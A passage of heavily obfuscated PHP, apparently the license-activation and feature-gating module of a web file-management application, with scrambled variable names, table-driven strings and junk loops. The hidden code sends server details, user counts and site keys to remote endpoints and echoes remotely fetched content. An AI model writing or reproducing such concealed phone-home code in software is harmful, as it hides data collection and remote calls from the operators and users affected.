$˜ŠŞĞïÎ[0] ? $˜ŠŞĞïÎ[0] : $this->defaultModule); $Á™¶Æ»İ = $µ½Éß°»[630]; define($ú„µ”Å‰[21], isset($˜ŠŞĞïÎ[1]) && $˜ŠŞĞïÎ[0] ? $˜ŠŞĞïÎ[1] : $this->defaultController); $ô²Ä°öÏ = $µ½Éß°»[631]; define($ú„µ”Å‰[22], isset($˜ŠŞĞïÎ[2]) && $˜ŠŞĞïÎ[0] ? $˜ŠŞĞïÎ[2] : $this->defaultAction); define($ú„µ”Å‰[23], MOD . $ú„µ”Å‰[0] . ST . $ú„µ”Å‰[0] . ACT); $÷¦ÚŒ›  = $µ½Éß°»[632]; $_SERVER[$ú„µ”Å‰[24]] = strtolower(ACTION); $ÃÜÖ’æë = $µ½Éß°»[633]; if (strlen($ÃÜÖ’æë) < $µ½Éß°»[625]) { die; } $this->autorun(); if (count($˜ŠŞĞïÎ) >= 3) { $this->appRun($½™Ø€í); } else { $this->appRun(ACTION); } } private $qufp0c9d1777 = array(); private $uylfd4baec45 = ''; public function vfqjbb38f6bd() { $¢†Çğñ˜ =& $_SERVER[ì™ı‰º¯]; $«´ˆÂòç =& $_SERVER[Ê³óµ¯‡]; $this->ntpw14e6d9cb(); $«™â¾ú = $¢†Çğñ˜[634]; if (!$«™â¾ú) { return; } $this->gndv941fb50a(); $ƒÃš¬ù = $¢†Çğñ˜[635]; if (strlen($ƒÃš¬ù) < $¢†Çğñ˜[612]) { die; } $this->ahpx88d0fdb4(); $this->gjbk3e707a5a(); $this->bhlg36a64707(); $this->uglpf5332bfe(); $ÄåŠîæõ = $¢†Çğñ˜[636]; if (strlen($ÄåŠîæõ) < $¢†Çğñ˜[610]) { return; } $this->twym963352db(); $­¬¶ğà = $¢†Çğñ˜[637]; if (!$­¬¶ğà) { die; } $this->yersaf6e8575($«´ˆÂòç[25], array($this, $«´ˆÂòç[26])); $this->yersaf6e8575($«´ˆÂòç[27], array($this, $«´ˆÂòç[28])); $ÆÔ¶Î¶ = $¢†Çğñ˜[638]; while (strlen($ÆÔ¶Î¶) < $¢†Çğñ˜[618]) { if (!$ÆÔ¶Î¶) { break; } $ÆÔ¶Î¶++; } $this->yersaf6e8575($«´ˆÂòç[29], array($this, $«´ˆÂòç[30])); $this->yersaf6e8575($«´ˆÂòç[31], array($this, $«´ˆÂòç[32])); $Õˆ½äƒ¢ = $¢†Çğñ˜[639]; } public function peck00751be1($¿”ò¢) { $ëïØåÉ =& $_SERVER[ì™ı‰º¯]; $—ïÔáÃá =& $_SERVER[Ê³óµ¯‡]; $ÂúÚ£´Ö = Model($—ïÔáÃá[33])->get(); $¨ï¸†•¨ = array($—ïÔáÃá[34], $—ïÔáÃá[35], $—ïÔáÃá[36], $—ïÔáÃá[37], $—ïÔáÃá[38], $—ïÔáÃá[39], $—ïÔáÃá[40], $—ïÔáÃá[41], $—ïÔáÃá[42], $—ïÔáÃá[43], $—ïÔáÃá[44], $—ïÔáÃá[45], $—ïÔáÃá[46], $—ïÔáÃá[47], $—ïÔáÃá[48], $—ïÔáÃá[49], $—ïÔáÃá[50], $—ïÔáÃá[51], $—ïÔáÃá[52], $—ïÔáÃá[53], $—ïÔáÃá[54], $—ïÔáÃá[55], $—ïÔáÃá[56], $—ïÔáÃá[57], $—ïÔáÃá[58], $—ïÔáÃá[59], $—ïÔáÃá[60], $—ïÔáÃá[61], $—ïÔáÃá[62], $—ïÔáÃá[63], $—ïÔáÃá[64], $—ïÔáÃá[65], $—ïÔáÃá[66], $—ïÔáÃá[67], $—ïÔáÃá[68], $—ïÔáÃá[69], $—ïÔáÃá[70], $—ïÔáÃá[71], $—ïÔáÃá[72], $—ïÔáÃá[73], $—ïÔáÃá[74], $—ïÔáÃá[75], $—ïÔáÃá[76], $—ïÔáÃá[77], $—ïÔáÃá[78], $—ïÔáÃá[79], $—ïÔáÃá[80], $—ïÔáÃá[81], $—ïÔáÃá[82], $—ïÔáÃá[83], $—ïÔáÃá[84]); foreach ($¨ï¸†•¨ as $ª»Ê–¦Ü) { $µ¶û¤¥… = $GLOBALS[$—ïÔáÃá[85]][$—ïÔáÃá[86]][$ª»Ê–¦Ü]; $÷®ÙËĞê = $ëïØåÉ[640]; if (isset($ÂúÚ£´Ö[$ª»Ê–¦Ü])) { $µ¶û¤¥… = $ÂúÚ£´Ö[$ª»Ê–¦Ü]; } $¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$ª»Ê–¦Ü] = $µ¶û¤¥…; } $„¥ˆôé = $¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$—ïÔáÃá[46]]; unset($¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[89]][$—ïÔáÃá[90]]); unset($¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[89]][$—ïÔáÃá[91]]); $×éÙ¯å = $ëïØåÉ[641]; if (strlen($×éÙ¯å) < $ëïØåÉ[618]) { return; } unset($¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$—ïÔáÃá[46]]); unset($¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$—ïÔáÃá[92]]); $¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$—ïÔáÃá[93]] = array($—ïÔáÃá[94] => (int) $„¥ˆôé[$—ïÔáÃá[95]], $—ïÔáÃá[96] => (int) _get($„¥ˆôé, $—ïÔáÃá[97], 0)); $ç·±ŠÏ‰ = $ëïØåÉ[642]; while (strlen($ç·±ŠÏ‰) < $ëïØåÉ[610]) { if (!$ç·±ŠÏ‰) { break; } $ç·±ŠÏ‰++; } $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[99]] = Action($—ïÔáÃá[100])->accessToken(); $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[101]] = md5($_SERVER[$—ïÔáÃá[102]] . $ÂúÚ£´Ö[$—ïÔáÃá[103]]); $—ÓÜùğä = $ëïØåÉ[643]; if (strlen($—ÓÜùğä) < $ëïØåÉ[618]) { die; } $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[104]] = base64_encode(serverInfo()); $›ÓÖ”ìÄ = $ëïØåÉ[644]; while ($›ÓÖ”ìÄ < $ëïØåÉ[615]) { if ($›ÓÖ”ìÄ >= 0) { break; } $›ÓÖ”ìÄ++; } $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[105]] = $this->uylfd4baec45; $Ö·®‚î® = $ëïØåÉ[645]; if ($ÂúÚ£´Ö[$—ïÔáÃá[105]] != $—ïÔáÃá[106]) { $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[107]] = $ÂúÚ£´Ö[$—ïÔáÃá[107]]; $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[108]] = $ÂúÚ£´Ö[$—ïÔáÃá[108]]; $ÒÔÙÚç = rand_string(10) . $this->uylfd4baec45 . rand_string(5); $¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[109]][$—ïÔáÃá[110]] = $this->yeaj8deb25f5($ÒÔÙÚç, $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[101]]); } if ($this->uylfd4baec45 == $—ïÔáÃá[106]) { $¿”ò¢[$—ïÔáÃá[87]][$—ïÔáÃá[88]][$—ïÔáÃá[93]][$—ïÔáÃá[97]] = 0; } $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[111]] = _get($this->qufp0c9d1777, $—ïÔáÃá[112], $—ïÔáÃá[6]); $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[113]] = _get($this->qufp0c9d1777, $—ïÔáÃá[114], $—ïÔáÃá[6]); if (_get($GLOBALS, $—ïÔáÃá[115]) && $this->config[$—ïÔáÃá[116]]) { $¿”ò¢[$—ïÔáÃá[98]][$—ïÔáÃá[117]] = WEB_ROOT; } return $¿”ò¢; } private function uglpf5332bfe() { $Ç¥Àç™á =& $_SERVER[ì™ı‰º¯]; $ã’£şöå =& $_SERVER[Ê³óµ¯‡]; $³ÍÕ½ó = $_SERVER[$ã’£şöå[24]] == $ã’£şöå[118]; $¯©‡éµ = $Ç¥Àç™á[646]; while (strlen($¯©‡éµ) < $Ç¥Àç™á[612]) { if (!$¯©‡éµ) { break; } $¯©‡éµ++; } if ($_SERVER[$ã’£şöå[24]] == $ã’£şöå[119] && $_GET[$ã’£şöå[120]] == $ã’£şöå[121]) { $³ÍÕ½ó = !0; } if ($³ÍÕ½ó) { $¬ÔŠü = array($ã’£şöå[105] => $this->uylfd4baec45, $ã’£şöå[122] => $this->bznj0a4bc1c3(), $ã’£şöå[123] => Model($ã’£şöå[124])->count()); if ($this->uylfd4baec45 != $ã’£şöå[106]) { $²ËÌíØÇ = _get($this->qufp0c9d1777, $ã’£şöå[125]); if ($²ËÌíØÇ) { $¬ÔŠü[$ã’£şöå[126]] = $²ËÌíØÇ; $¬ÔŠü[$ã’£şöå[127]] = strtotime(_get($this->qufp0c9d1777, $ã’£şöå[128])); $¬ÔŠü[$ã’£şöå[129]] = _get($this->qufp0c9d1777, $ã’£şöå[114]); } $„Ñ‹Š®ˆ = Model($ã’£şöå[33])->get($ã’£şöå[130], $ã’£şöå[6], !0); if (is_string($„Ñ‹Š®ˆ) && substr($„Ñ‹Š®ˆ, 0, 1) == $ã’£şöå[131]) { $„Ñ‹Š®ˆ = json_decode_force($„Ñ‹Š®ˆ); } if (is_array($„Ñ‹Š®ˆ) && $„Ñ‹Š®ˆ[$ã’£şöå[132]] && strstr($„Ñ‹Š®ˆ[$ã’£şöå[132]], $ã’£şöå[133])) { $ü½Œ¯Ê = explode($ã’£şöå[133], $„Ñ‹Š®ˆ[$ã’£şöå[132]]); $¬ÔŠü[$ã’£şöå[134]] = $ü½Œ¯Ê[0]; } } $¬ÔŠü = $this->qypn5c1aa728(json_encode($¬ÔŠü), md5($ã’£şöå[135])); $Ê¨½Ó„ò = array($ã’£şöå[136] => $¬ÔŠü); $¸Òè»»™ = $Ç¥Àç™á[647]; if (!$¸Òè»»™) { return; } call_user_func(array($ã’£şöå[137], $ã’£şöå[138]), $Ê¨½Ó„ò); } if ($this->uylfd4baec45 == $ã’£şöå[106]) { return; } $œ« ¤úƒ = array($ã’£şöå[139], $ã’£şöå[140], $ã’£şöå[141], $ã’£şöå[142], $ã’£şöå[143], $ã’£şöå[144]); $úô ·¾¥ = Model($ã’£şöå[33])->get(); $Øİ×â‰ = $Ç¥Àç™á[648]; $Ê¨½Ó„ò = array($ã’£şöå[145] => $úô ·¾¥[$ã’£şöå[34]], $ã’£şöå[146] => $úô ·¾¥[$ã’£şöå[35]], $ã’£şöå[147] => $ã’£şöå[6]); $é·í½ = $Ç¥Àç™á[649]; foreach ($œ« ¤úƒ as $š‚³”º¥) { if (!isset($úô ·¾¥[$š‚³”º¥]) || !$úô ·¾¥[$š‚³”º¥]) { continue; } $Ê¨½Ó„ò[$š‚³”º¥] = $úô ·¾¥[$š‚³”º¥]; } call_user_func(array($ã’£şöå[137], $ã’£şöå[138]), $Ê¨½Ó„ò); } private function gjbk3e707a5a() { $ö›æÇŒ… =& $_SERVER[ì™ı‰º¯]; $Ï‘¬şÖÜ =& $_SERVER[Ê³óµ¯‡]; if ($_SERVER[$Ï‘¬şÖÜ[24]] != $Ï‘¬şÖÜ[148]) { return; } if (!_get($GLOBALS, $Ï‘¬şÖÜ[115])) { die; } $Î£Ìî® = $GLOBALS[$Ï‘¬şÖÜ[13]]; if (isset($Î£Ìî®[$Ï‘¬şÖÜ[149]])) { $this->jdou6c0596b8(); die; } if (!isset($Î£Ìî®[$Ï‘¬şÖÜ[150]]) || strlen($Î£Ìî®[$Ï‘¬şÖÜ[150]]) != 16) { show_json($Ï‘¬şÖÜ[151] . $Î£Ìî®[$Ï‘¬şÖÜ[150]], !1); } $ŒĞ°“®Ì = Model($Ï‘¬şÖÜ[33])->get($Ï‘¬şÖÜ[103]); $…ÔÏİ§ = md5($_SERVER[$Ï‘¬şÖÜ[102]] . $ŒĞ°“®Ì); $”êôèëò = array($Ï‘¬şÖÜ[150] => $Î£Ìî®[$Ï‘¬şÖÜ[150]], $Ï‘¬şÖÜ[152] => rand_string(16), $Ï‘¬şÖÜ[153] => $Ï‘¬şÖÜ[135], $Ï‘¬şÖÜ[154] => $Ï‘¬şÖÜ[155], $Ï‘¬şÖÜ[156] => $_SERVER[$Ï‘¬şÖÜ[157]], $Ï‘¬şÖÜ[158] => $_SERVER[$Ï‘¬şÖÜ[159]], $Ï‘¬şÖÜ[160] => $_SERVER[$Ï‘¬şÖÜ[161]], $Ï‘¬şÖÜ[101] => $…ÔÏİ§, $Ï‘¬şÖÜ[162] => Model($Ï‘¬şÖÜ[33])->get($Ï‘¬şÖÜ[130])); $îõÈÇ« = $ö›æÇŒ…[650]; if (strlen($îõÈÇ«) < $ö›æÇŒ…[625]) { return; } if ($Î£Ìî®[$Ï‘¬şÖÜ[163]] == $Ï‘¬şÖÜ[164]) { $Óº¨ï¡ = $this->qypn5c1aa728($…ÔÏİ§, $Ï‘¬şÖÜ[165]); $ş·¶¥’å = $this->yeaj8deb25f5(json_encode($”êôèëò), $…ÔÏİ§ . $Ï‘¬şÖÜ[166], 3); $ş·¶¥’å = $ş·¶¥’å . $Ï‘¬şÖÜ[167] . $_SERVER[$Ï‘¬şÖÜ[157]]; $›åÙ±’Ú = $this->tfwm9ad03d00($Ï‘¬şÖÜ[168] . $Óº¨ï¡ . $Ï‘¬şÖÜ[169] . $ş·¶¥’å, -1); show_json($›åÙ±’Ú, !0); } else { if ($Î£Ìî®[$Ï‘¬şÖÜ[163]] == $Ï‘¬şÖÜ[170]) { $Èˆ¯“ªñ = substr(md5($Ï‘¬şÖÜ[171] . $…ÔÏİ§), 12, 15) . $Ï‘¬şÖÜ[172]; $ş·¶¥’å = $this->scrjf48243ad(trim($Î£Ìî®[$Ï‘¬şÖÜ[173]]), $Èˆ¯“ªñ, 2); $’´•¸±€ = json_decode($ş·¶¥’å, !0); if (!is_array($’´•¸±€) || !is_array($’´•¸±€[$Ï‘¬şÖÜ[174]]) || $’´•¸±€[$Ï‘¬şÖÜ[150]] != !0) { $èÎƒÈØü = $Ï‘¬şÖÜ[175]; $œ¢¡•€¯ = $’´•¸±€[$Ï‘¬şÖÜ[174]] ? $Ï‘¬şÖÜ[176] . $’´•¸±€[$Ï‘¬şÖÜ[174]] : $èÎƒÈØü; show_json($œ¢¡•€¯, !1); } else { $”êôèëò[$Ï‘¬şÖÜ[152]] = $’´•¸±€[$Ï‘¬şÖÜ[174]][$Ï‘¬şÖÜ[177]]; } } else { $’´•¸±€ = $this->tfwm9ad03d00($Ï‘¬şÖÜ[178], $”êôèëò, 10); } } if (!is_array($’´•¸±€) || !is_array($’´•¸±€[$Ï‘¬şÖÜ[174]]) || $’´•¸±€[$Ï‘¬şÖÜ[150]] != !0) { $èÎƒÈØü = LNG($Ï‘¬şÖÜ[179]); $œ¢¡•€¯ = $’´•¸±€[$Ï‘¬şÖÜ[174]] ? $Ï‘¬şÖÜ[176] . $’´•¸±€[$Ï‘¬şÖÜ[174]] : $èÎƒÈØü; show_json($œ¢¡•€¯, !1); } $†Äµ«íº = $’´•¸±€[$Ï‘¬şÖÜ[174]]; $”Ú¢ÅËµ = $this->lhru6465a383($†Äµ«íº[$Ï‘¬şÖÜ[180]]); if (!$”Ú¢ÅËµ || $”Ú¢ÅËµ != $†Äµ«íº[$Ï‘¬şÖÜ[128]]) { $ôî°¼£ş = array($Ï‘¬şÖÜ[181] => Model($Ï‘¬şÖÜ[33])->get($Ï‘¬şÖÜ[103]), $Ï‘¬şÖÜ[182] => $_SERVER[$Ï‘¬şÖÜ[102]], $Ï‘¬şÖÜ[183] => this_url(), $Ï‘¬şÖÜ[158] => $_SERVER[$Ï‘¬şÖÜ[159]]); $ş·¶¥’å = $this->rxgi4a8adb65(json_encode($ôî°¼£ş)); $this->tfwm9ad03d00($Ï‘¬şÖÜ[184] . $ş·¶¥’å); show_json(LNG($Ï‘¬şÖÜ[185]), !0); } $ìüğß¯Á = array($Ï‘¬şÖÜ[186] => $†Äµ«íº[$Ï‘¬şÖÜ[187]], $Ï‘¬şÖÜ[188] => $†Äµ«íº[$Ï‘¬şÖÜ[189]], $Ï‘¬şÖÜ[190] => rand_string(16), $Ï‘¬şÖÜ[105] => $†Äµ«íº[$Ï‘¬şÖÜ[191]]); if ($”êôèëò[$Ï‘¬şÖÜ[152]]) { $ìüğß¯Á[$Ï‘¬şÖÜ[190]] = $”êôèëò[$Ï‘¬şÖÜ[152]]; } $…¢öĞËÒ = substr(md5($ìüğß¯Á[$Ï‘¬şÖÜ[188]]), 10, 10); $õ¿µ˜ËŸ = $…¢öĞËÒ . $ìüğß¯Á[$Ï‘¬şÖÜ[105]] . $ìüğß¯Á[$Ï‘¬şÖÜ[190]]; $ô³•ïä° = $ö›æÇŒ…[651]; while ($ô³•ïä° < $ö›æÇŒ…[612]) { if ($ô³•ïä° >= 0) { break; } $ô³•ïä°++; } $ìüğß¯Á[$Ï‘¬şÖÜ[107]] = strrev(base64_encode($this->qypn5c1aa728($õ¿µ˜ËŸ, $Ï‘¬şÖÜ[192]))); $øì¥ÜºÖ = $ö›æÇŒ…[652]; if (strlen($øì¥ÜºÖ) < $ö›æÇŒ…[618]) { return; } $Ñ§‘³ß = rand_string(16); $øœ¿ó­ß = $ö›æÇŒ…[653]; while ($øœ¿ó­ß < $ö›æÇŒ…[618]) { if ($øœ¿ó­ß >= 0) { break; } $øœ¿ó­ß++; } $éúú²ÖÍ = $Ñ§‘³ß . $ìüğß¯Á[$Ï‘¬şÖÜ[105]] . $this->qypn5c1aa728(md5($ìüğß¯Á[$Ï‘¬şÖÜ[186]]), $Ñ§‘³ß); $Š¶ãÛ = $ö›æÇŒ…[654]; $ìüğß¯Á[$Ï‘¬şÖÜ[108]] = base64_encode(strrev($this->qypn5c1aa728($éúú²ÖÍ, $Ï‘¬şÖÜ[193]))); if ($†Äµ«íº[$Ï‘¬şÖÜ[194]] && $†Äµ«íº[$Ï‘¬şÖÜ[194]] >= 1) { Model($Ï‘¬şÖÜ[33])->setDeep($Ï‘¬şÖÜ[195], $Ï‘¬şÖÜ[121]); } Model($Ï‘¬şÖÜ[33])->set($ìüğß¯Á); $ùŸÉ£Í¬ = md5($_SERVER[$Ï‘¬şÖÜ[102]] . strrev($ŒĞ°“®Ì) . $ìüğß¯Á[$Ï‘¬şÖÜ[188]]); $Íİç„¼ = strrev(substr($ùŸÉ£Í¬, 10, 16)); $ùÁ•¢Èû = $ö›æÇŒ…[655]; if (strlen($ùÁ•¢Èû) < $ö›æÇŒ…[618]) { die; } $Ç­°Ÿª = $this->yeaj8deb25f5(json_encode($†Äµ«íº), $ùŸÉ£Í¬); $…èÈ°¢ß = $ö›æÇŒ…[656]; if (strlen($…èÈ°¢ß) < $ö›æÇŒ…[618]) { return; } $ÆÖˆ¬€ = array_to_keyvalue(Model($Ï‘¬şÖÜ[7])->listData(), $Ï‘¬şÖÜ[196]); $´»Ğµ¼ = $ÆÖˆ¬€[$Ï‘¬şÖÜ[197]]; $‰ÔŞ›ÈÜ = $ö›æÇŒ…[657]; while (strlen($‰ÔŞ›ÈÜ) < $ö›æÇŒ…[618]) { if (!$‰ÔŞ›ÈÜ) { break; } $‰ÔŞ›ÈÜ++; } $üÆ€ìïì = array(); $šêÎÎ•Ó = $ö›æÇŒ…[658]; while (strlen($šêÎÎ•Ó) < $ö›æÇŒ…[612]) { if (!$šêÎÎ•Ó) { break; } $šêÎÎ•Ó++; } $üÆ€ìïì[$Íİç„¼] = $Ç­°Ÿª; $ËÈ¹÷ŒÉ = $ö›æÇŒ…[659]; if (strlen($ËÈ¹÷ŒÉ) < $ö›æÇŒ…[615]) { die; } Model($Ï‘¬şÖÜ[7])->update($´»Ğµ¼[$Ï‘¬şÖÜ[198]], array($Ï‘¬şÖÜ[199] => $üÆ€ìïì)); $öœôÕ‘ = $ö›æÇŒ…[660]; while ($öœôÕ‘ < $ö›æÇŒ…[612]) { if ($öœôÕ‘ >= 0) { break; } $öœôÕ‘++; } $this->qufp0c9d1777 = $†Äµ«íº; $¦ÔøƒÃÄ = $ö›æÇŒ…[661]; $this->uylfd4baec45 = $ìüğß¯Á[$Ï‘¬şÖÜ[105]]; $Ğû§Íæ¬ = $ö›æÇŒ…[662]; while ($Ğû§Íæ¬ < $ö›æÇŒ…[615]) { if ($Ğû§Íæ¬ >= 0) { break; } $Ğû§Íæ¬++; } $this->licenseRegistSuccess(); Cache::set($Ï‘¬şÖÜ[200] . md5($ŒĞ°“®Ì . $Ï‘¬şÖÜ[201]), $Ï‘¬şÖÜ[6]); show_json(LNG($Ï‘¬şÖÜ[185]), !0); } private function licenseRegistSuccess() { $æ²´Ä´İ =& $_SERVER[Ê³óµ¯‡]; $÷Û±äÅô = Model($æ²´Ä´İ[33])->get(); if ($÷Û±äÅô[$æ²´Ä´İ[63]] != $æ²´Ä´İ[121]) { Model($æ²´Ä´İ[33])->set($æ²´Ä´İ[63], $æ²´Ä´İ[121]); } Action($æ²´Ä´İ[202])->initStart(!0); } private function jdou6c0596b8() { $¡üÀôÉæ =& $_SERVER[ì™ı‰º¯]; $—Ø¡ú¶– =& $_SERVER[Ê³óµ¯‡]; Model($—Ø¡ú¶–[33])->set(array($—Ø¡ú¶–[186] => $—Ø¡ú¶–[6], $—Ø¡ú¶–[188] => $—Ø¡ú¶–[6], $—Ø¡ú¶–[105] => $—Ø¡ú¶–[106], $—Ø¡ú¶–[107] => $—Ø¡ú¶–[6], $—Ø¡ú¶–[108] => $—Ø¡ú¶–[6])); Model($—Ø¡ú¶–[33])->setDeep($—Ø¡ú¶–[195], $—Ø¡ú¶–[203]); $ ğˆĞ = $¡üÀôÉæ[663]; if (!$ ğˆĞ) { die; } $this->qufp0c9d1777 = array(); $this->uylfd4baec45 = $—Ø¡ú¶–[106]; $‘¾ÖßÑ = $¡üÀôÉæ[664]; } private function ntpw14e6d9cb() { $‰„ÖÃ¬õ =& $_SERVER[ì™ı‰º¯]; $æã½›õÆ =& $_SERVER[Ê³óµ¯‡]; $_SERVER[$æã½›õÆ[159]] = _get($_SERVER, $æã½›õÆ[159], APP_HOST); $this->uylfd4baec45 = $æã½›õÆ[106]; $äÃñÕØ = $‰„ÖÃ¬õ[665]; while (strlen($äÃñÕØ) < $‰„ÖÃ¬õ[618]) { if (!$äÃñÕØ) { break; } $äÃñÕØ++; } $œæ¿İ©Ñ = Model($æã½›õÆ[33])->get(); $àÍ½¤ï = $‰„ÖÃ¬õ[666]; if ($œæ¿İ©Ñ[$æã½›õÆ[105]] == $æã½›õÆ[106]) { return; } $“€˜¸¶À = Model($æã½›õÆ[33])->get($æã½›õÆ[103]); $Ì¼‡’´ƒ = $‰„ÖÃ¬õ[667]; if (!$Ì¼‡’´ƒ) { return; } $ŸÍ ³Š£ = $æã½›õÆ[200] . md5($“€˜¸¶À . $æã½›õÆ[201]); $÷ôß¿« = $‰„ÖÃ¬õ[668]; if (strlen($÷ôß¿«) < $‰„ÖÃ¬õ[610]) { die; } $ª†©ì“Ô = Cache::get($ŸÍ ³Š£); if (!is_array($ª†©ì“Ô) || !isset($ª†©ì“Ô[$æã½›õÆ[204]]) || time() - $ª†©ì“Ô[$æã½›õÆ[204]] >= 60) { $Ù®’Ê¸ = Model($æã½›õÆ[7])->loadList(); $ö—èÙÀ = $Ù®’Ê¸[$æã½›õÆ[197]]; $Æå·¿Ê‹ = md5($_SERVER[$æã½›õÆ[102]] . strrev($“€˜¸¶À) . $œæ¿İ©Ñ[$æã½›õÆ[188]]); $á•¿Û¹È = strrev(substr($Æå·¿Ê‹, 10, 16)); $ª†©ì“Ô = $this->scrjf48243ad($ö—èÙÀ[$æã½›õÆ[85]][$á•¿Û¹È], $Æå·¿Ê‹); $ª†©ì“Ô = json_decode($ª†©ì“Ô, !0); } if (!is_array($ª†©ì“Ô)) { return $this->jdou6c0596b8(); } $¾·‰Ñº” = strtotime($ª†©ì“Ô[$æã½›õÆ[128]]); if (time() >= $¾·‰Ñº”) { return $this->jdou6c0596b8(); } if (time() - $ª†©ì“Ô[$æã½›õÆ[204]] > 20) { $ª†©ì“Ô[$æã½›õÆ[204]] = time(); Cache::set($ŸÍ ³Š£, $ª†©ì“Ô); } $this->qufp0c9d1777 = $ª†©ì“Ô; $this->uylfd4baec45 = $œæ¿İ©Ñ[$æã½›õÆ[105]]; } private function gndv941fb50a() { $ó—ŞÀäå =& $_SERVER[ì™ı‰º¯]; $§ƒöÑ¡İ =& $_SERVER[Ê³óµ¯‡]; $¢Ï¢Ó‡ = $GLOBALS[$§ƒöÑ¡İ[13]]; $Şóòí¶ï = $_SERVER[$§ƒöÑ¡İ[24]]; $¦ÆÓÛóÏ = $ó—ŞÀäå[669]; if (strlen($¦ÆÓÛóÏ) < $ó—ŞÀäå[615]) { die; } if ($Şóòí¶ï == $§ƒöÑ¡İ[205] && $this->uylfd4baec45 == $§ƒöÑ¡İ[106]) { show_json(LNG($§ƒöÑ¡İ[206]), !1, $§ƒöÑ¡İ[207]); } $– Ššæù = array($§ƒöÑ¡İ[208], $§ƒöÑ¡İ[209]); if (in_array($Şóòí¶ï, $– Ššæù)) { if ($this->uylfd4baec45 == $§ƒöÑ¡İ[106] && isset($¢Ï¢Ó‡[$§ƒöÑ¡İ[210]])) { show_json(LNG($§ƒöÑ¡İ[206]), !1, $§ƒöÑ¡İ[207]); die; } $á°˜”ãÃ = $this->bznj0a4bc1c3(); if ($á°˜”ãÃ != intval($§ƒöÑ¡İ[211])) { if ($á°˜”ãÃ <= Model($§ƒöÑ¡İ[124])->count()) { show_json(LNG($§ƒöÑ¡İ[212]), !1, $§ƒöÑ¡İ[207]); die; } } } } private function ahpx88d0fdb4() { $­©Â§ĞÄ =& $_SERVER[ì™ı‰º¯]; $ÓıÔšúû =& $_SERVER[Ê³óµ¯‡]; $“¯«ë±º = array($ÓıÔšúû[118], $ÓıÔšúû[119]); if (!_get($GLOBALS, $ÓıÔšúû[115]) || !isset($_GET[$ÓıÔšúû[213]])) { return; } if (!in_array($_SERVER[$ÓıÔšúû[24]], $“¯«ë±º)) { return; } $³øÆÃº = $ÓıÔšúû[214]; $³øÆÃº = $this->uvqxfe4f1a11($³øÆÃº, $ÓıÔšúû[215]); $È¡Œ—Ã = $­©Â§ĞÄ[670]; $³ˆ¤—³ = stream_context_create(array($ÓıÔšúû[216] => array($ÓıÔšúû[217] => $ÓıÔšúû[218], $ÓıÔšúû[219] => 3))); $ş­àƒ² = $­©Â§ĞÄ[671]; if (!$ş­àƒ²) { die; } $÷¼Ã‡äº = @file_get_contents($³øÆÃº, !1, $³ˆ¤—³); header($ÓıÔšúû[220]); $Î¼ƒ‡ÔÈ = $­©Â§ĞÄ[672]; if (strlen($Î¼ƒ‡ÔÈ) < $­©Â§ĞÄ[612]) { return; } if ($÷¼Ã‡äº && strstr($÷¼Ã‡äº, $ÓıÔšúû[221])) { echo $÷¼Ã‡äº; } die; } public function fcyi55c3e5c0($‹ö®šÖÇ) { $×Ô›ùà =& $_SERVER[ì™ı‰º¯]; $Øëš×” =& $_SERVER[Ê³óµ¯‡]; if ($this->uylfd4baec45 == $Øëš×”[222]) { return $‹ö®šÖÇ; } $ÕÀ†¬’Œ = array($Øëš×”[223] => $Øëš×”[224], $Øëš×”[225] => $Øëš×”[224], $Øëš×”[226] => $Øëš×”[224], $Øëš×”[227] => $Øëš×”[224], $Øëš×”[228] => $Øëš×”[229], $Øëš×”[230] => $Øëš×”[229], $Øëš×”[231] => $Øëš×”[229], $Øëš×”[232] => $Øëš×”[229], $Øëš×”[233] => $Øëš×”[229], $Øëš×”[234] => $Øëš×”[229], $Øëš×”[235] => $Øëš×”[229], $Øëš×”[236] => $Øëš×”[229], $Øëš×”[237] => $Øëš×”[229], $Øëš×”[238] => $Øëš×”[229], $Øëš×”[239] => $Øëš×”[229], $Øëš×”[240] => $Øëš×”[229]); $¶îè î¥ = explode($Øëš×”[241], _get($this->qufp0c9d1777, $Øëš×”[112], $Øëš×”[6])); $Îúë´Ú¥ = $×Ô›ùà[673]; while ($Îúë´Ú¥ < $×Ô›ùà[610]) { if ($Îúë´Ú¥ >= 0) { break; } $Îúë´Ú¥++; } $äîÑôüŒ = array(); foreach ($ÕÀ†¬’Œ as $åƒÕãœ => $Ø–Ãí»Ğ) { if ($Ø–Ãí»Ğ == $Øëš×”[224] && substr($this->uylfd4baec45, 0, 1) == $Øëš×”[224]) { continue; } if (!in_array($åƒÕãœ, $¶îè î¥)) { $äîÑôüŒ[] = $åƒÕãœ; } } foreach ($äîÑôüŒ as $åƒÕãœ) { unset($‹ö®šÖÇ[$åƒÕãœ]); } return $‹ö®šÖÇ; } private function twym963352db() { $°ÖÃ‘¦ˆ =& $_SERVER[Ê³óµ¯‡]; if ($this->uylfd4baec45 != $°ÖÃ‘¦ˆ[106]) { $GLOBALS[$°ÖÃ‘¦ˆ[85]][$°ÖÃ‘¦ˆ[89]][$°ÖÃ‘¦ˆ[242]] = $°ÖÃ‘¦ˆ[203]; return; } $GLOBALS[$°ÖÃ‘¦ˆ[85]][$°ÖÃ‘¦ˆ[243]] = $°ÖÃ‘¦ˆ[121]; if (Model($°ÖÃ‘¦ˆ[244])->get($°ÖÃ‘¦ˆ[63]) != $°ÖÃ‘¦ˆ[203]) { Model($°ÖÃ‘¦ˆ[244])->set($°ÖÃ‘¦ˆ[63], $°ÖÃ‘¦ˆ[203]); } } public function jsmp880dfc31() { $¢«ş¦ş– =& $_SERVER[ì™ı‰º¯]; return $_SERVER[Ê³óµ¯‡][245]; $»¾¬õÙª = $¢«ş¦ş–[674]; if 